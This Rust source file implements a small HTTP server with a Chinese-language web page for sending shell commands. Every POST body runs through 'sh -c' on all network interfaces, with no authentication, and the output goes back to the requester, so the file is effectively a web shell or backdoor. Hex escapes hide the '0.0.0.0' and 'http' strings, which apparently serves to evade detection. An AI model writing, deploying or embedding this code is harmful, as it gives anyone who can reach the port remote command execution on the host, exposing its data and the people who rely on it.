
use std::os::unix::io::{AsRawFd, RawFd};
use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::thread;
use std::process::Command;

const HTML: &str = r#"<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>命令执行</title>
</head>
<body>
    <textarea id="command" style="width:300px;height:60px;" placeholder="输入命令，Enter发送，Shift+Enter换行"></textarea>
    <button onclick="send_command()">发送指令</button>
    <pre id="result"></pre>
    <script>
        function send_command() {
            let cmd = document.getElementById('command').value;
            fetch('/', {
                method: 'POST',
                headers: {'Content-Type': 'text/plain'},
                body: cmd
            })
            .then(resp => resp.text())
            .then(txt => document.getElementById('result').innerText = txt)
            .catch(e => document.getElementById('result').innerText = '请求失败: ' + e);
        }
        document.getElementById('command').addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                send_command();
            }
        });
    </script>
</body>
</html>
"#;

pub fn listen_on_port(port: u16) {
    let addr = format!("0.\x30.0.\x30:{}", port);
    let listener = TcpListener::bind(&addr).expect(&format!("无法绑定端口{}", port));
    println!("HTTP服务已启动: h\x74\x74p://{}/", addr);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| {
                    handle_client(stream);
                });
            }
            Err(e) => {
                eprintln!("连接失败: {}", e);
            }
        }
    }
}

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 4096];
    let bytes_read = match stream.read(&mut buffer) {
        Ok(n) => n,
        Err(_) => return,
    };
    let request = String::from_utf8_lossy(&buffer[..bytes_read]);

    if request.starts_with("GET / ") {
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\n\r\n{}",
            HTML.as_bytes().len(),
            HTML
        );
        let _ = stream.write_all(response.as_bytes());
    } else if request.starts_with("POST / ") {
        if let Some(idx) = request.find("\r\n\r\n") {
            let body = &request[idx + 4..];
            let cmd = body.trim();
            let output = if !cmd.is_empty() {
                Command::new("sh")
                    .arg("-c")
                    .arg(cmd)
                    .output()
                    .map(|o| {
                        let out = String::from_utf8_lossy(&o.stdout);
                        let err = String::from_utf8_lossy(&o.stderr);
                        format!("{}{}", out, err)
                    })
                    .unwrap_or_else(|e| format!("命令执行失败: {}", e))
            } else {
                "未输入命令".to_string()
            };
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: {}\r\n\r\n{}",
                output.as_bytes().len(),
                output
            );
            let _ = stream.write_all(response.as_bytes());
        }
    } else {
        let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
        let _ = stream.write_all(response.as_bytes());
    }
}